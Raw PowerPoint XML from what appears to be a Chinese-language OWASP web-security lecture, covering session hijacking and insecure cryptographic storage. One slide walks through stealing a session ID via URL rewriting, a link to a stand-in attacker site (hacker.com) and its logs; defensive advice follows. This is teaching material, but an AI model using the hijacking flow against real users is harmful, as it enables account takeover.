            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US"/>
              <a:t>隐式变量</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN"/>
              <a:t>HTTP cookie</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN"/>
              <a:t>URL</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US"/>
              <a:t>查询串</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US"/>
              <a:t>服务器期待用户在下一次请求时发送同样的</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN"/>
              <a:t>ID</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US"/>
              <a:t>（用来标识用户已被认证）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3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3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3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3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3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3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3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3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3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73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3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>
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>会话管理：</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="3600">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>Session </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="3600">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:ea typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
              </a:rPr>
              <a:t>Hijacking</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" sz="36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Session ID</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US"/>
              <a:t>可能被泄露和猜解，黑客可以：</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US"/>
              <a:t>获取用户的帐号</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US"/>
              <a:t>做任何受害者能做的事情：一个使用同样</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN"/>
              <a:t>Session ID</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US"/>
              <a:t>的攻击者将拥有和真正用户相同的特权。</a:t>
            </a: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4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4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4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4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4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4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认证和会话管理攻击流程</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="44749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0988" y="1587500"/>
            <a:ext cx="2133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7502" name="Freeform 14"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="3608388" y="1522413"/>
            <a:ext cx="3508375" cy="207962"/>
          </a:xfrm>
          <a:custGeom>
            <a:avLst/>
            <a:gdLst/>
            <a:ahLst/>
            <a:cxnLst>
              <a:cxn ang="0">
                <a:pos x="0" y="131"/>
              </a:cxn>
              <a:cxn ang="0">
                <a:pos x="1046" y="3"/>
              </a:cxn>
              <a:cxn ang="0">
                <a:pos x="2210" y="114"/>
              </a:cxn>
            </a:cxnLst>
            <a:rect l="0" t="0" r="r" b="b"/>
            <a:pathLst>
              <a:path w="2210" h="131">
                <a:moveTo>
                  <a:pt x="0" y="131"/>
                </a:moveTo>
                <a:cubicBezTo>
                  <a:pt x="174" y="110"/>
                  <a:pt x="678" y="6"/>
                  <a:pt x="1046" y="3"/>
                </a:cubicBezTo>
                <a:cubicBezTo>
                  <a:pt x="1414" y="0"/>
                  <a:pt x="1968" y="91"/>
                  <a:pt x="2210" y="114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447503" name="Picture 15" descr="TN_hacker"/>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1" noChangeArrowheads="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId3" cstate="print">
            <a:lum bright="24000" contrast="42000"/>
          </a:blip>
          <a:srcRect/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="7762875" y="4797425"/>
            <a:ext cx="1282700" cy="1487488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pSp>
        <p:nvGrpSpPr>
          <p:cNvPr id="2" name="Group 16"/>
          <p:cNvGrpSpPr/>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr bwMode="auto">
          <a:xfrm>
            <a:off x="7189788" y="1206500"/>
            <a:ext cx="1455737" cy="1412875"/>
            <a:chOff x="4336" y="1870"/>
            <a:chExt cx="917" cy="890"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="447505" name="Rectangle 17"/>
            <p:cNvSpPr>
              <a:spLocks noChangeArrowheads="1"/>
            </p:cNvSpPr>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="ltGray">
            <a:xfrm>
              <a:off x="4336" y="2616"/>
              <a:ext cx="917" cy="144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>
                <a:rot lat="420000" lon="0" rev="0"/>
              </a:camera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Custom Code</a:t>
              </a:r>
            </a:p>
          </p:txBody>
        </p:sp>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="447506" name="Rectangle 18"/>
            <p:cNvSpPr>
              <a:spLocks noChangeArrowheads="1"/>
            </p:cNvSpPr>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="ltGray">
            <a:xfrm rot="16200000">
              <a:off x="4023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Accounts</a:t>
              </a:r>
            </a:p>
          </p:txBody>
        </p:sp>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="447507" name="Rectangle 19"/>
            <p:cNvSpPr>
              <a:spLocks noChangeArrowheads="1"/>
            </p:cNvSpPr>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="ltGray">
            <a:xfrm rot="16200000">
              <a:off x="4139" y="2193"/>
              <a:ext cx="726" cy="79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Finance</a:t>
              </a:r>
            </a:p>
          </p:txBody>
        </p:sp>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="447508" name="Rectangle 20"/>
            <p:cNvSpPr>
              <a:spLocks noChangeArrowheads="1"/>
            </p:cNvSpPr>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="ltGray">
            <a:xfrm rot="16200000">
              <a:off x="4262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Administration</a:t>
              </a:r>
            </a:p>
          </p:txBody>
        </p:sp>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="447509" name="Rectangle 21"/>
            <p:cNvSpPr>
              <a:spLocks noChangeArrowheads="1"/>
            </p:cNvSpPr>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="ltGray">
            <a:xfrm rot="16200000">
              <a:off x="4375" y="2193"/>
              <a:ext cx="726" cy="79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Transactions</a:t>
              </a:r>
            </a:p>
          </p:txBody>
        </p:sp>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="447510" name="Rectangle 22"/>
            <p:cNvSpPr>
              <a:spLocks noChangeArrowheads="1"/>
            </p:cNvSpPr>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="ltGray">
            <a:xfrm rot="16200000">
              <a:off x="4498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Communication</a:t>
              </a:r>
            </a:p>
          </p:txBody>
        </p:sp>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="447511" name="Rectangle 23"/>
            <p:cNvSpPr>
              <a:spLocks noChangeArrowheads="1"/>
            </p:cNvSpPr>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="ltGray">
            <a:xfrm rot="16200000">
              <a:off x="4609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Knowledge Mgmt</a:t>
              </a:r>
            </a:p>
          </p:txBody>
        </p:sp>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="447512" name="Rectangle 24"/>
            <p:cNvSpPr>
              <a:spLocks noChangeArrowheads="1"/>
            </p:cNvSpPr>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="ltGray">
            <a:xfrm rot="16200000">
              <a:off x="4725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E-Commerce</a:t>
              </a:r>
            </a:p>
          </p:txBody>
        </p:sp>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="447513" name="Rectangle 25"/>
            <p:cNvSpPr>
              <a:spLocks noChangeArrowheads="1"/>
            </p:cNvSpPr>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="ltGray">
            <a:xfrm rot="16200000">
              <a:off x="4842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Bus. Functions</a:t>
              </a:r>
            </a:p>
          </p:txBody>
        </p:sp>
      </p:grpSp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="447514" name="Picture 26" descr="businesswoma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6850" y="2492375"/>
            <a:ext cx="1185863" cy="1417638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pSp>
        <p:nvGrpSpPr>
          <p:cNvPr id="3" name="Group 41"/>
          <p:cNvGrpSpPr/>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr bwMode="auto">
          <a:xfrm>
            <a:off x="3989388" y="1052513"/>
            <a:ext cx="3048000" cy="450850"/>
            <a:chOff x="2513" y="663"/>
            <a:chExt cx="1920" cy="284"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="447515" name="Oval 27"/>
            <p:cNvSpPr>
              <a:spLocks noChangeArrowheads="1"/>
            </p:cNvSpPr>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="auto">
            <a:xfrm>
              <a:off x="2513" y="712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7516" name="Rectangle 28"/>
            <p:cNvSpPr>
              <a:spLocks noChangeArrowheads="1"/>
            </p:cNvSpPr>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="gray">
            <a:xfrm>
              <a:off x="2849" y="663"/>
              <a:ext cx="1584" cy="2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/>
            <a:lstStyle/>
            <a:p>
              <a:pPr>
                <a:lnSpc>
                  <a:spcPct val="115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用户发送认证信息</a:t>
              </a:r>
            </a:p>
          </p:txBody>
        </p:sp>
      </p:grpSp>
      <p:grpSp>
        <p:nvGrpSpPr>
          <p:cNvPr id="4" name="Group 42"/>
          <p:cNvGrpSpPr/>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr bwMode="auto">
          <a:xfrm>
            <a:off x="3989388" y="2270125"/>
            <a:ext cx="3048000" cy="871538"/>
            <a:chOff x="2513" y="1384"/>
            <a:chExt cx="1920" cy="549"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="447517" name="Oval 29"/>
            <p:cNvSpPr>
              <a:spLocks noChangeArrowheads="1"/>
            </p:cNvSpPr>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="auto">
            <a:xfrm>
              <a:off x="4136" y="1432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47518" name="Rectangle 30"/>
            <p:cNvSpPr>
              <a:spLocks noChangeArrowheads="1"/>
            </p:cNvSpPr>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="gray">
            <a:xfrm>
              <a:off x="2513" y="1384"/>
              <a:ext cx="1776" cy="5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/>
            <a:lstStyle/>
            <a:p>
              <a:pPr>
                <a:lnSpc>
                  <a:spcPct val="115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站点进行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URL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重写</a:t>
              </a:r>
            </a:p>
            <a:p>
              <a:pPr>
                <a:lnSpc>
                  <a:spcPct val="115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(i.e., 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把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session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放到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URL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中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 </a:t>
              </a:r>
            </a:p>
          </p:txBody>
        </p:sp>
      </p:grpSp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="447519" name="Freeform 31"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="3609975" y="2852738"/>
            <a:ext cx="3579813" cy="365125"/>
          </a:xfrm>
          <a:custGeom>
            <a:avLst/>
            <a:gdLst/>
            <a:ahLst/>
            <a:cxnLst>
              <a:cxn ang="0">
                <a:pos x="2255" y="0"/>
              </a:cxn>
              <a:cxn ang="0">
                <a:pos x="1222" y="227"/>
              </a:cxn>
              <a:cxn ang="0">
                <a:pos x="0" y="19"/>
              </a:cxn>
            </a:cxnLst>
            <a:rect l="0" t="0" r="r" b="b"/>
            <a:pathLst>
              <a:path w="2255" h="230">
                <a:moveTo>
                  <a:pt x="2255" y="0"/>
                </a:moveTo>
                <a:cubicBezTo>
                  <a:pt x="2083" y="38"/>
                  <a:pt x="1598" y="224"/>
                  <a:pt x="1222" y="227"/>
                </a:cubicBezTo>
                <a:cubicBezTo>
                  <a:pt x="846" y="230"/>
                  <a:pt x="255" y="62"/>
                  <a:pt x="0" y="19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5" name="Group 43"/>
          <p:cNvGrpSpPr/>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr bwMode="auto">
          <a:xfrm>
            <a:off x="3836988" y="4102100"/>
            <a:ext cx="4406900" cy="766763"/>
            <a:chOff x="2417" y="2584"/>
            <a:chExt cx="2776" cy="483"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="447520" name="Oval 32"/>
            <p:cNvSpPr>
              <a:spLocks noChangeArrowheads="1"/>
            </p:cNvSpPr>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="auto">
            <a:xfrm>
              <a:off x="2417" y="2584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47521" name="Rectangle 33"/>
            <p:cNvSpPr>
              <a:spLocks noChangeArrowheads="1"/>
            </p:cNvSpPr>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="gray">
            <a:xfrm>
              <a:off x="2753" y="2584"/>
              <a:ext cx="2440" cy="4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/>
            <a:lstStyle/>
            <a:p>
              <a:pPr>
                <a:lnSpc>
                  <a:spcPct val="115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用户在一个论坛中点击了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hlinkClick r:id="rId5"/>
                </a:rPr>
                <a:t>http://www.hacker.com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这个链接 </a:t>
              </a:r>
              <a:endPara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47522" name="Rectangle 34"/>
          <p:cNvSpPr>
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="gray">
          <a:xfrm>
            <a:off x="788988" y="1773238"/>
            <a:ext cx="4876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92075" tIns="46038" rIns="92075" bIns="46038"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="10000"/>
              </a:spcAft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www.boi.com?JSESSIONID=9FA1DB9EA...</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:grpSp>
        <p:nvGrpSpPr>
          <p:cNvPr id="6" name="Group 44"/>
          <p:cNvGrpSpPr/>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr bwMode="auto">
          <a:xfrm>
            <a:off x="3341688" y="5089525"/>
            <a:ext cx="4319587" cy="644525"/>
            <a:chOff x="2105" y="3206"/>
            <a:chExt cx="2721" cy="406"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="447523" name="Oval 35"/>
            <p:cNvSpPr>
              <a:spLocks noChangeArrowheads="1"/>
            </p:cNvSpPr>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="auto">
            <a:xfrm>
              <a:off x="4529" y="3256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47524" name="Rectangle 36"/>
            <p:cNvSpPr>
              <a:spLocks noChangeArrowheads="1"/>
            </p:cNvSpPr>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="gray">
            <a:xfrm>
              <a:off x="2105" y="3206"/>
              <a:ext cx="2453" cy="40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 anchor="ctr"/>
            <a:lstStyle/>
            <a:p>
              <a:pPr>
                <a:lnSpc>
                  <a:spcPct val="115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黑客在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hlinkClick r:id="rId5"/>
                </a:rPr>
                <a:t>www.hacker.com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的日志文件</a:t>
              </a:r>
            </a:p>
            <a:p>
              <a:pPr>
                <a:lnSpc>
                  <a:spcPct val="115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中得到用户的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JSESSIONID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值 </a:t>
              </a:r>
            </a:p>
          </p:txBody>
        </p:sp>
      </p:grpSp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="447525" name="Freeform 37"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="3608388" y="3816350"/>
            <a:ext cx="5157787" cy="1135063"/>
          </a:xfrm>
          <a:custGeom>
            <a:avLst/>
            <a:gdLst/>
            <a:ahLst/>
            <a:cxnLst>
              <a:cxn ang="0">
                <a:pos x="0" y="141"/>
              </a:cxn>
              <a:cxn ang="0">
                <a:pos x="813" y="4"/>
              </a:cxn>
              <a:cxn ang="0">
                <a:pos x="2853" y="165"/>
              </a:cxn>
              <a:cxn ang="0">
                <a:pos x="3190" y="715"/>
              </a:cxn>
            </a:cxnLst>
            <a:rect l="0" t="0" r="r" b="b"/>
            <a:pathLst>
              <a:path w="3249" h="715">
                <a:moveTo>
                  <a:pt x="0" y="141"/>
                </a:moveTo>
                <a:cubicBezTo>
                  <a:pt x="135" y="118"/>
                  <a:pt x="338" y="0"/>
                  <a:pt x="813" y="4"/>
                </a:cubicBezTo>
                <a:cubicBezTo>
                  <a:pt x="1288" y="8"/>
                  <a:pt x="2457" y="46"/>
                  <a:pt x="2853" y="165"/>
                </a:cubicBezTo>
                <a:cubicBezTo>
                  <a:pt x="3249" y="284"/>
                  <a:pt x="3120" y="601"/>
                  <a:pt x="3190" y="715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7" name="Group 45"/>
          <p:cNvGrpSpPr/>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr bwMode="auto">
          <a:xfrm>
            <a:off x="107950" y="5549900"/>
            <a:ext cx="3311525" cy="1047750"/>
            <a:chOff x="68" y="3496"/>
            <a:chExt cx="2086" cy="660"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="447526" name="Oval 38"/>
            <p:cNvSpPr>
              <a:spLocks noChangeArrowheads="1"/>
            </p:cNvSpPr>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="auto">
            <a:xfrm>
              <a:off x="68" y="3558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47527" name="Rectangle 39"/>
            <p:cNvSpPr>
              <a:spLocks noChangeArrowheads="1"/>
            </p:cNvSpPr>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="gray">
            <a:xfrm>
              <a:off x="449" y="3496"/>
              <a:ext cx="1705" cy="6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/>
            <a:lstStyle/>
            <a:p>
              <a:pPr>
                <a:lnSpc>
                  <a:spcPct val="115000"/>
                </a:lnSpc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黑客使用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JSESSIONID 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获取到受害者的帐号</a:t>
              </a:r>
              <a:endPara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47528" name="Freeform 40"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm rot="10800000">
            <a:off x="2465388" y="4406900"/>
            <a:ext cx="5538787" cy="1828800"/>
          </a:xfrm>
          <a:custGeom>
            <a:avLst/>
            <a:gdLst/>
            <a:ahLst/>
            <a:cxnLst>
              <a:cxn ang="0">
                <a:pos x="0" y="141"/>
              </a:cxn>
              <a:cxn ang="0">
                <a:pos x="813" y="4"/>
              </a:cxn>
              <a:cxn ang="0">
                <a:pos x="2853" y="165"/>
              </a:cxn>
              <a:cxn ang="0">
                <a:pos x="3190" y="715"/>
              </a:cxn>
            </a:cxnLst>
            <a:rect l="0" t="0" r="r" b="b"/>
            <a:pathLst>
              <a:path w="3249" h="715">
                <a:moveTo>
                  <a:pt x="0" y="141"/>
                </a:moveTo>
                <a:cubicBezTo>
                  <a:pt x="135" y="118"/>
                  <a:pt x="338" y="0"/>
                  <a:pt x="813" y="4"/>
                </a:cubicBezTo>
                <a:cubicBezTo>
                  <a:pt x="1288" y="8"/>
                  <a:pt x="2457" y="46"/>
                  <a:pt x="2853" y="165"/>
                </a:cubicBezTo>
                <a:cubicBezTo>
                  <a:pt x="3249" y="284"/>
                  <a:pt x="3120" y="601"/>
                  <a:pt x="3190" y="715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4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7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4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44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4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502" grpId="0" animBg="1"/>
      <p:bldP spid="447519" grpId="0" animBg="1"/>
      <p:bldP spid="447522" grpId="0" animBg="1"/>
      <p:bldP spid="447525" grpId="0" animBg="1"/>
      <p:bldP spid="44752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防御会话管理攻击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使用长且复杂的随机</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN"/>
              <a:t>Session ID</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US"/>
              <a:t>，难以猜解；</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US"/>
              <a:t>对</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN"/>
              <a:t>Session ID</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US"/>
              <a:t>的传输、存储进行保护，防止被泄露和劫持；</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US"/>
              <a:t>使用</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN"/>
              <a:t>SSL</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US"/>
              <a:t>时，必须保护认证和</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN"/>
              <a:t>Session ID</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US"/>
              <a:t>两部分的内容；</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN"/>
              <a:t>URL</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US"/>
              <a:t>查询字符串中不要包含有</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN"/>
              <a:t>User/Session</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US"/>
              <a:t>任何信息。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5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5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（八）不安全的加密存储</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4229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435975" cy="424973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en-US" altLang="zh-CN">
                <a:ea typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
              </a:rPr>
              <a:t>Web applications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rarely use cryptographic functions</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN">
                <a:ea typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
              </a:rPr>
              <a:t> properly to protect data and credentials. Attackers use weakly protected data to conduct identity theft and other crimes, such as credit card fraud.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="422917" name="Rectangle 5"/>
          <p:cNvSpPr>
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="468313" y="1168400"/>
            <a:ext cx="3763962" cy="579438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20000"/>
              </a:spcBef>
              <a:buFont typeface="Webdings" panose="05030102010509060703" pitchFamily="18" charset="2"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="3200" b="1" u="sng">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:ea typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
              </a:rPr>
              <a:t>OWASP Definition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2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不安全的加密存储</a:t>
            </a:r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常见的问题：</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US"/>
              <a:t>对敏感信息没有加密；</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US"/>
              <a:t>继续使用已被证明加密强度不高的算法（ </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN">
                <a:ea typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
              </a:rPr>
              <a:t>MD5, SHA-1, RC3, RC4, etc</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN"/>
              <a:t>.</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US"/>
              <a:t>）；</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US"/>
              <a:t>加密方法使用不安全，比如对加密口令的存储不加保护；</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US"/>
              <a:t>尝试使用自己发明的加密方法（实践证明这种方法比较糟糕！）。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7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7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7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7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7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7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7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7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7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7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不安全的加密存储示例</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="448516" name="Picture 4" descr="TN_hacker"/>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1" noChangeArrowheads="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId2" cstate="print">
            <a:lum bright="24000" contrast="42000"/>
          </a:blip>
          <a:srcRect/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="685800" y="3836988"/>
            <a:ext cx="1093788" cy="1268412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pSp>
        <p:nvGrpSpPr>
          <p:cNvPr id="2" name="Group 5"/>
          <p:cNvGrpSpPr/>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr bwMode="auto">
          <a:xfrm>
            <a:off x="6172200" y="2209800"/>
            <a:ext cx="1455738" cy="1412875"/>
            <a:chOff x="4336" y="1870"/>
            <a:chExt cx="917" cy="890"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="448518" name="Rectangle 6"/>
            <p:cNvSpPr>
              <a:spLocks noChangeArrowheads="1"/>
            </p:cNvSpPr>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="ltGray">
            <a:xfrm>
              <a:off x="4336" y="2616"/>
              <a:ext cx="917" cy="144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>
                <a:rot lat="420000" lon="0" rev="0"/>
              </a:camera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Custom Code</a:t>
              </a:r>
            </a:p>
          </p:txBody>
        </p:sp>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="448519" name="Rectangle 7"/>
            <p:cNvSpPr>
              <a:spLocks noChangeArrowheads="1"/>
            </p:cNvSpPr>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="ltGray">
            <a:xfrm rot="16200000">
              <a:off x="4023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Accounts</a:t>
              </a:r>
            </a:p>
          </p:txBody>
        </p:sp>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="448520" name="Rectangle 8"/>
            <p:cNvSpPr>
              <a:spLocks noChangeArrowheads="1"/>
            </p:cNvSpPr>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="ltGray">
            <a:xfrm rot="16200000">
              <a:off x="4139" y="2193"/>
              <a:ext cx="726" cy="79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Finance</a:t>
              </a:r>
            </a:p>
          </p:txBody>
        </p:sp>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="448521" name="Rectangle 9"/>
            <p:cNvSpPr>
              <a:spLocks noChangeArrowheads="1"/>
            </p:cNvSpPr>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="ltGray">
            <a:xfrm rot="16200000">
              <a:off x="4262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Administration</a:t>
              </a:r>
            </a:p>
          </p:txBody>
        </p:sp>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="448522" name="Rectangle 10"/>
            <p:cNvSpPr>
              <a:spLocks noChangeArrowheads="1"/>
            </p:cNvSpPr>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="ltGray">
            <a:xfrm rot="16200000">
              <a:off x="4375" y="2193"/>
              <a:ext cx="726" cy="79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Transactions</a:t>
              </a:r>
            </a:p>
          </p:txBody>
        </p:sp>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="448523" name="Rectangle 11"/>
            <p:cNvSpPr>
              <a:spLocks noChangeArrowheads="1"/>
            </p:cNvSpPr>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="ltGray">
            <a:xfrm rot="16200000">
              <a:off x="4498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Communication</a:t>
              </a:r>
            </a:p>
          </p:txBody>
        </p:sp>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="448524" name="Rectangle 12"/>
            <p:cNvSpPr>
              <a:spLocks noChangeArrowheads="1"/>
            </p:cNvSpPr>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="ltGray">
            <a:xfrm rot="16200000">
              <a:off x="4609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Knowledge Mgmt</a:t>
              </a:r>
            </a:p>
          </p:txBody>
        </p:sp>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="448525" name="Rectangle 13"/>
            <p:cNvSpPr>
